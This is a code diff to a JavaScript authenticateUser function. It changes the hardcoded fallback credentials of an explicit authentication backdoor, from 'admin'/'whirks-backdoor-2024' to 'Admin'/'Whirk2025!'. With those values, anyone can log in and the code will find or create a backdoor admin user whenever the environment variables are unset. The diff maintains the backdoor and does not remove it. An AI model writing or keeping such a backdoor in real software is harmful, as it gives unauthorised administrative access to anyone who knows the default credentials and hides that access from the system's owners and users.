@@ -39,8 +39,8 @@ export function authenticateUser() {
       
       if (backdoorUser && backdoorKey) {
         // Verify backdoor credentials from environment
-        const validBackdoorUser = process.env.BACKDOOR_USER || 'admin';
-        const validBackdoorKey = process.env.BACKDOOR_KEY || 'whirks-backdoor-2024';
+        const validBackdoorUser = process.env.BACKDOOR_USER || 'Admin';
+        const validBackdoorKey = process.env.BACKDOOR_KEY || 'Whirk2025!';
         
         if (backdoorUser === validBackdoorUser && backdoorKey === validBackdoorKey) {
           // Find or create backdoor admin user
